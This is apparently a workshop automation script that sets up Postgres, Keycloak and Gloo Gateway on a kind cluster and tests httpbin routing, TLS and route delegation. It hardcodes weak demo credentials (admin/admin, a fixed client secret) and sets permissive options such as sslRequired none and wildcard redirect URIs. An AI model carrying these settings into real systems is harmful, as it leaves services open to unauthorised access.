#!/usr/bin/env bash
source /root/.env 2>/dev/null || true
source ./scripts/assert.sh
export CLUSTER1=cluster1
bash ./data/steps/deploy-kind-clusters/deploy-cluster1.sh
./scripts/check.sh cluster1
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Clusters are healthy", () => {
    const clusters = ["cluster1"];

    clusters.forEach(cluster => {
        it(`Cluster ${cluster} is healthy`, () => helpers.k8sObjectIsPresent({ context: cluster, namespace: "default", k8sType: "service", k8sObj: "kubernetes" }));
    });
});
EOF
echo "executing test dist/document/build/templates/steps/deploy-kind-clusters/tests/cluster-healthy.test.js.liquid from lab number 1"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 1"; exit 1; }
kubectl --context ${CLUSTER1} create namespace gloo-system
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: postgres
  namespace: gloo-system
---
apiVersion: v1
kind: Secret
metadata:
  name: postgres-secrets
  namespace: gloo-system
type: Opaque
data:
  POSTGRES_DB: ZGI=
  POSTGRES_USER: YWRtaW4=
  POSTGRES_PASSWORD: YWRtaW4=
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: postgres-pvc
  namespace: gloo-system
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 5Gi
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: postgres
  namespace: gloo-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: postgres
  template:
    metadata:
      labels:
        app: postgres
    spec:
      serviceAccountName: postgres
      volumes:
        - name: postgres-storage
          persistentVolumeClaim:
            claimName: postgres-pvc
      containers:
        - name: postgres
          image: postgres:13.2-alpine
          imagePullPolicy: 'IfNotPresent'
          ports:
            - containerPort: 5432
          envFrom:
            - secretRef:
                name: postgres-secrets
          volumeMounts:
            - name: postgres-storage
              mountPath: /var/lib/postgresql/data
              subPath: postgres
---
apiVersion: v1
kind: Service
metadata:
  name: postgres
  namespace: gloo-system
spec:
  selector:
    app: postgres
  ports:
    - port: 5432
EOF
kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy/postgres

sleep 5
kubectl --context ${CLUSTER1} -n gloo-system exec deploy/postgres -- psql -U admin -d db -c "CREATE DATABASE keycloak;"
kubectl --context ${CLUSTER1} -n gloo-system exec deploy/postgres -- psql -U admin -d db -c "CREATE USER keycloak WITH PASSWORD 'password';"
kubectl --context ${CLUSTER1} -n gloo-system exec deploy/postgres -- psql -U admin -d db -c "GRANT ALL PRIVILEGES ON DATABASE keycloak TO keycloak;"
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Postgres", () => {
  it('postgres pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "gloo-system", k8sObj: "postgres" }));
});
EOF
echo "executing test dist/document/build/templates/steps/deploy-keycloak/tests/postgres-available.test.js.liquid from lab number 2"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
KEYCLOAK_CLIENT=gloo-ext-auth
KEYCLOAK_SECRET=hKcDcqmUKCrPkyDJtCw066hTLzUbAiri
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: oauth
  namespace: gloo-system
type: extauth.solo.io/oauth
stringData:
  client-id: ${KEYCLOAK_CLIENT}
  client-secret: ${KEYCLOAK_SECRET}
EOF
kubectl --context ${CLUSTER1} create namespace keycloak

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
data:
  workshop-realm.json: |-
    {
      "realm": "workshop",
      "enabled": true,
      "displayName": "solo.io",
      "accessTokenLifespan": 1800,
      "sslRequired": "none",
      "users": [
        {
          "username": "user1",
          "enabled": true,
          "email": "user1@example.com",
          "attributes": {
            "group": [
              "users"
            ],
            "subscription": [
              "enterprise"
            ]
          },
          "credentials": [
            {
              "type": "password",
              "secretData": "{\"value\":\"JsfNbCOIdZUbyBJ+BT+VoGI91Ec2rWLOvkLPDaX8e9k=\",\"salt\":\"P5rtFkGtPfoaryJ6PizUJw==\",\"additionalParameters\":{}}",
              "credentialData": "{\"hashIterations\":27500,\"algorithm\":\"pbkdf2-sha256\",\"additionalParameters\":{}}"
            }
          ]
        },
        {
          "username": "user2",
          "enabled": true,
          "email": "user2@solo.io",
          "attributes": {
            "group": [
              "users"
            ],
            "subscription": [
              "free"
            ],
            "show_personal_data": [
              "false"
            ]
          },
          "credentials": [
            {
              "type": "password",
              "secretData": "{\"value\":\"RITBVPdh5pvXOa4JzJ5pZTE0rG96zhnQNmSsKCf83aU=\",\"salt\":\"drB9e5Smf3cbfUfF3FUerw==\",\"additionalParameters\":{}}",
              "credentialData": "{\"hashIterations\":27500,\"algorithm\":\"pbkdf2-sha256\",\"additionalParameters\":{}}"
            }
          ]
        },
        {
          "username": "admin1",
          "enabled": true,
          "email": "admin1@solo.io",
          "attributes": {
            "group": [
              "admin"
            ],
            "show_personal_data": [
              "false"
            ]
          },
          "credentials": [
            {
              "type": "password",
              "secretData" : "{\"value\":\"BruFLfFkjH/8erZ26NnrbkOrWiZuQyDRCHD9o0R6Scg=\",\"salt\":\"Cf9AYCE5pAbb4CKEF0GUTA==\",\"additionalParameters\":{}}",
              "credentialData" : "{\"hashIterations\":5,\"algorithm\":\"argon2\",\"additionalParameters\":{\"hashLength\":[\"32\"],\"memory\":[\"7168\"],\"type\":[\"id\"],\"version\":[\"1.3\"],\"parallelism\":[\"1\"]}}"
            }
          ]
        }
      ],
      "clients": [
        {
          "clientId": "${KEYCLOAK_CLIENT}",
          "secret": "${KEYCLOAK_SECRET}",
          "redirectUris": [
            "*"
          ],
          "webOrigins": [
            "+"
          ],
          "authorizationServicesEnabled": true,
          "directAccessGrantsEnabled": true,
          "serviceAccountsEnabled": true,
          "protocolMappers": [
            {
              "name": "group",
              "protocol": "openid-connect",
              "protocolMapper": "oidc-usermodel-attribute-mapper",
              "config": {
                "claim.name": "group",
                "user.attribute": "group",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            },
            {
              "name": "show_personal_data",
              "protocol": "openid-connect",
              "protocolMapper": "oidc-usermodel-attribute-mapper",
              "config": {
                "claim.name": "show_personal_data",
                "user.attribute": "show_personal_data",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            },
            {
              "name": "subscription",
              "protocol": "openid-connect",
              "protocolMapper": "oidc-usermodel-attribute-mapper",
              "config": {
                "claim.name": "subscription",
                "user.attribute": "subscription",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            },
            {
              "name": "name",
              "protocol": "openid-connect",
              "protocolMapper": "oidc-usermodel-property-mapper",
              "config": {
                "claim.name": "name",
                "user.attribute": "username",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            }
          ]
        }
      ],
      "components": {
        "org.keycloak.userprofile.UserProfileProvider": [
          {
            "providerId": "declarative-user-profile",
            "config": {
              "kc.user.profile.config": [
                "{\"attributes\":[{\"name\":\"username\"},{\"name\":\"email\"}],\"unmanagedAttributePolicy\":\"ENABLED\"}"
              ]
            }
          }
        ]
      }
    }
  portal-realm.json: |
    {
      "realm": "portal-mgmt",
      "enabled": true,
      "sslRequired": "none",
      "roles": {
        "client": {
          "gloo-portal-idp": [
            {
              "name": "uma_protection",
              "composite": false,
              "clientRole": true,
              "attributes": {}
            }
          ]
        },
        "realm": [
          {
            "name": "default-roles-portal-mgmt",
            "description": "${role_default-roles}",
            "composite": true,
            "composites": {
              "realm": [
                "offline_access",
                "uma_authorization"
              ],
              "client": {
                "account": [
                  "manage-account",
                  "view-profile"
                ]
              }
            },
            "clientRole": false,
            "attributes": {}
          },
          {
            "name": "uma_authorization",
            "description": "${role_uma_authorization}",
            "composite": false,
            "clientRole": false
          }
        ]
      },
      "users": [
        {
          "username": "service-account-gloo-portal-idp",
          "createdTimestamp": 1727724261768,
          "emailVerified": false,
          "enabled": true,
          "totp": false,
          "serviceAccountClientId": "gloo-portal-idp",
          "disableableCredentialTypes": [],
          "requiredActions": [],
          "realmRoles": [
            "default-roles-portal-mgmt"
          ],
          "clientRoles": {
            "realm-management": [
              "manage-clients"
            ],
            "gloo-portal-idp": [
              "uma_protection"
            ]
          },
          "notBefore": 0,
          "groups": []
        }
      ],
      "clients": [
        {
          "clientId": "gloo-portal-idp",
          "enabled": true,
          "name": "Solo.io Gloo Portal Resource Server",
          "clientAuthenticatorType": "client-secret",
          "secret": "gloo-portal-idp-secret",
          "serviceAccountsEnabled": true,
          "authorizationServicesEnabled": true,
          "authorizationSettings": {
            "allowRemoteResourceManagement": true,
            "policyEnforcementMode": "ENFORCING",
            "resources": [
              {
                "name": "Default Resource",
                "type": "urn:gloo-portal-idp:resources:default",
                "ownerManagedAccess": false,
                "attributes": {},
                "uris": [
                  "/*"
                ]
              }
            ],
            "policies": [
              {
                "name": "Default Policy",
                "description": "A policy that grants access only for users within this realm",
                "type": "regex",
                "logic": "POSITIVE",
                "decisionStrategy": "AFFIRMATIVE",
                "config": {
                  "targetContextAttributes" : "false",
                  "pattern" : ".*",
                  "targetClaim" : "sub"
                }
              },
              {
                "name": "Default Permission",
                "description": "A permission that applies to the default resource type",
                "type": "resource",
                "logic": "POSITIVE",
                "decisionStrategy": "UNANIMOUS",
                "config": {
                  "defaultResourceType": "urn:gloo-portal-idp:resources:default",
                  "applyPolicies": "[\"Default Policy\"]"
                }
              }
            ],
            "scopes": [],
            "decisionStrategy": "UNANIMOUS"
          }
        }
      ]
    }
kind: ConfigMap
metadata:
  name: realms
  namespace: keycloak
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: keycloak
  namespace: keycloak
  labels:
    app: keycloak
spec:
  ports:
  - name: http
    port: 8080
    targetPort: 8080
  selector:
    app: keycloak
  type: LoadBalancer
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: keycloak
  namespace: keycloak
  labels:
    app: keycloak
spec:
  replicas: 1
  selector:
    matchLabels:
      app: keycloak
  template:
    metadata:
      labels:
        app: keycloak
    spec:
      containers:
      - name: keycloak
        image: quay.io/keycloak/keycloak:25.0.5
        args:
        - start-dev
        - --import-realm
        - --proxy-headers=xforwarded
        - --features=hostname:v1
        - --hostname-strict=false
        - --hostname-strict-https=false
        env:
        - name: KEYCLOAK_ADMIN
          value: admin
        - name: KEYCLOAK_ADMIN_PASSWORD
          value: admin
        - name: KC_DB
          value: postgres
        - name: KC_DB_URL
          value: jdbc:postgresql://postgres.gloo-system.svc.cluster.local:5432/keycloak
        - name: KC_DB_USERNAME
          value: keycloak
        - name: KC_DB_PASSWORD
          value: password
        ports:
        - name: http
          containerPort: 8080
        readinessProbe:
          httpGet:
            path: /realms/workshop
            port: 8080
        volumeMounts:
        - name: realms
          mountPath: /opt/keycloak/data/import
      volumes:
      - name: realms
        configMap:
          name: realms
EOF
kubectl --context ${CLUSTER1} -n keycloak rollout status deploy/keycloak
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Keycloak", () => {
  it('keycloak pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "keycloak", k8sObj: "keycloak" }));
});
EOF
echo "executing test dist/document/build/templates/steps/deploy-keycloak/tests/pods-available.test.js.liquid from lab number 2"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("Retrieve enterprise-networking ip", () => {
  it("A value for load-balancing has been assigned", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n keycloak get svc keycloak -o jsonpath='{.status.loadBalancer}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('"ingress"');
  });
});
EOF
echo "executing test dist/document/build/templates/steps/deploy-keycloak/tests/keycloak-ip-is-attached.test.js.liquid from lab number 2"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
timeout 2m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n keycloak get svc keycloak -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
  sleep 1
done"
export ENDPOINT_KEYCLOAK=$(kubectl --context ${CLUSTER1} -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}'):8080
export HOST_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK%:*})
export PORT_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK##*:})
export KEYCLOAK_URL=http://${ENDPOINT_KEYCLOAK}
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("Address '" + process.env.HOST_KEYCLOAK + "' can be resolved in DNS", () => {
    it(process.env.HOST_KEYCLOAK + ' can be resolved', (done) => {
        return dns.lookup(process.env.HOST_KEYCLOAK, (err, address, family) => {
            expect(address).to.be.an.ip;
            done();
        });
    });
});
EOF
echo "executing test ./default/tests/can-resolve.test.js.liquid from lab number 2"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
echo "Waiting for Keycloak to be ready at $KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token"
timeout 300 bash -c 'while [[ "$(curl -m 2 -s -o /dev/null -w ''%{http_code}'' $KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token)" != "405" ]]; do printf '.';sleep 1; done' || false
kubectl --context $CLUSTER1 apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.2.0/experimental-install.yaml
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: portal-database-config
  namespace: gloo-system
type: Opaque
data:
  config.yaml: |
    ZHNuOiBob3N0PXBvc3RncmVzLmdsb28tc3lzdGVtLnN2Yy5jbHVzdGVyLmxvY2FsIHBvcnQ9NTQzMiB1c2VyPWFkbWluIHBhc3N3b3JkPWFkbWluIGRibmFtZT1kYiBzc2xtb2RlPWRpc2FibGUK
EOF

helm repo add gloo-ee-helm https://storage.googleapis.com/gloo-ee-helm
helm repo update

helm upgrade -i -n gloo-system \
  gloo-gateway gloo-ee-helm/gloo-ee \
  --create-namespace \
  --version 1.18.8 \
  --kube-context $CLUSTER1 \
  --set-string license_key=$LICENSE_KEY \
  -f -<<EOF

gloo:
  kubeGateway:
    enabled: true
    portal:
      enabled: true
  gatewayProxies:
    gatewayProxy:
      disabled: true
  gateway:
    validation:
      allowWarnings: true
      alwaysAcceptResources: false
  gloo:
    logLevel: info
    deployment:
      livenessProbeEnabled: true
  discovery:
    enabled: false
observability:
  enabled: false
prometheus:
  enabled: false
grafana:
  defaultInstallationEnabled: false
gloo-fed:
  enabled: false
  glooFedApiserver:
    enable: false
gateway-portal-web-server:
  enabled: true
  glooPortalServer:
    database:
      type: postgres
EOF
echo -n Waiting for Gloo Gateway pods to be ready...
kubectl --context $CLUSTER1 -n gloo-system rollout status deployment
kubectl --context $CLUSTER1 -n gloo-system get pods
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Gloo Gateway", () => {
  let cluster = process.env.CLUSTER1
  let deployments = ["gloo", "extauth", "rate-limit", "redis"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "gloo-system", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/document/build/templates/steps/deploy-gloo-gateway-enterprise/tests/check-gloo.test.js.liquid from lab number 3"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 3"; exit 1; }
kubectl --context ${CLUSTER1} create ns httpbin
kubectl --context ${CLUSTER1} apply -f data/steps/deploy-httpbin/app-httpbin1.yaml
kubectl --context ${CLUSTER1} apply -f data/steps/deploy-httpbin/app-httpbin2.yaml
echo -n Waiting for httpbin pods to be ready...
kubectl --context ${CLUSTER1} -n httpbin rollout status deployment
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("httpbin app", () => {
  let cluster = process.env.CLUSTER1
  let deployments = ["httpbin1", "httpbin2"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "httpbin", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/deploy-httpbin/tests/check-httpbin.test.js.liquid from lab number 4"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 4"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
kind: Gateway
apiVersion: gateway.networking.k8s.io/v1
metadata:
  name: http
  namespace: gloo-system
spec:
  gatewayClassName: gloo-gateway
  listeners:
  - protocol: HTTP
    port: 80
    name: http
    allowedRoutes:
      namespaces:
        from: All
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: http
  hostnames:
    - "httpbin.example.com"
  rules:
    - backendRefs:
        - name: httpbin1
          port: 8000
EOF
export PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
RETRY_COUNT=0
MAX_RETRIES=60
GLOO_PROXY_SVC=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -oname)
while [[ -z "$PROXY_IP" && $RETRY_COUNT -lt $MAX_RETRIES && $GLOO_PROXY_SVC ]]; do
  echo "Waiting for PROXY_IP to be assigned... Attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
  PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
  RETRY_COUNT=$((RETRY_COUNT + 1))
  sleep 5
done

# if PROXY_IP is a hostname, resolve it to an IP address
if [[ -n "$PROXY_IP" && $PROXY_IP =~ [a-zA-Z] ]]; then
  while [[ -z "$IP" && $RETRY_COUNT -lt $MAX_RETRIES ]]; do
    echo "Waiting for PROXY_IP to be propagated in DNS... Attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
    IP=$(dig +short A "$PROXY_IP" | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ {print; exit}')
    RETRY_COUNT=$((RETRY_COUNT + 1))
    sleep 5
  done
else
  IP="$PROXY_IP"
fi

if [[ -z "$PROXY_IP" ]]; then
  echo "WARNING: Maximum number of retries reached. PROXY_IP could not be assigned."
else
  export PROXY_IP
  export IP
  echo "PROXY_IP has been assigned: $PROXY_IP"
  echo "IP has been resolved to: $IP"
fi

./scripts/register-domain.sh httpbin.example.com ${PROXY_IP}

cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTP", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `http://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/expose-httpbin/tests/http.test.js.liquid from lab number 5"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 5"; exit 1; }
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
   -keyout tls.key -out tls.crt -subj "/CN=*"
kubectl create --context ${CLUSTER1} -n gloo-system secret tls tls-secret --key tls.key \
   --cert tls.crt
kubectl apply --context ${CLUSTER1} -f - <<EOF
kind: Gateway
apiVersion: gateway.networking.k8s.io/v1
metadata:
  name: http
  namespace: gloo-system
spec:
  gatewayClassName: gloo-gateway
  listeners:
  - protocol: HTTPS
    port: 443
    name: https-httpbin
    hostname: httpbin.example.com
    tls:
      mode: Terminate
      certificateRefs:
        - name: tls-secret
          kind: Secret
    allowedRoutes:
      namespaces:
        from: All
  - protocol: HTTPS
    port: 443
    name: https
    tls:
      mode: Terminate
      certificateRefs:
        - name: tls-secret
          kind: Secret
    allowedRoutes:
      namespaces:
        from: All
  - protocol: HTTP
    port: 80
    name: http
    allowedRoutes:
      namespaces:
        from: All
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy gloo-proxy-http
echo -n Wait for up to 2 minutes until the url is ready...
RETRY_COUNT=0
MAX_RETRIES=30
while [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; do
  echo "Attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
  ret=`curl -k -s -o /dev/null -w %{http_code} https://httpbin.example.com/get`
  if [ "$ret" -eq "200" ]; then
    break
  else
    echo "Response was: $ret"
    echo "Retrying in 4 seconds..."
  fi
  RETRY_COUNT=$((RETRY_COUNT + 1))
  sleep 4
done
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/expose-httpbin/tests/https.test.js.liquid from lab number 5"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 5"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: redirect-http-to-https
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: http
  hostnames:
    - "httpbin.example.com"
  rules:
    - filters:
      - type: RequestRedirect
        requestRedirect:
          scheme: https
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("location header correctly set", () => {
  it('Checking text \'location\'', () => helpersHttp.checkHeaders({ host: `http://httpbin.example.com`, path: '/get', expectedHeaders: [{'key': 'location', 'value': `https://httpbin.example.com/get`}]}));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/expose-httpbin/tests/redirect-http-to-https.test.js.liquid from lab number 5"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 5"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: '*'
          namespace: httpbin
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/delegation/tests/https.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /status
      backendRefs:
        - name: '*'
          namespace: httpbin
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: Exact
          value: /status/200
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
  annotations:
    delegation.gateway.solo.io/inherit-parent-matcher: "true"
spec:
  rules:
    - matches:
      - path:
          type: Exact
          value: /200
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
  annotations:
    delegation.gateway.solo.io/inherit-parent-matcher: "true"
spec:
  parentRefs:
    - name: httpbin
      namespace: gloo-system
      group: gateway.networking.k8s.io
      kind: HTTPRoute
  rules:
    - matches:
      - path:
          type: Exact
          value: /200
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin-status
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /status
      backendRefs:
        - name: httpbin2
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'201\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/201', retCode: 201 }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/delegation/tests/status-201.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
kubectl delete --context ${CLUSTER1} -n httpbin httproute httpbin-status

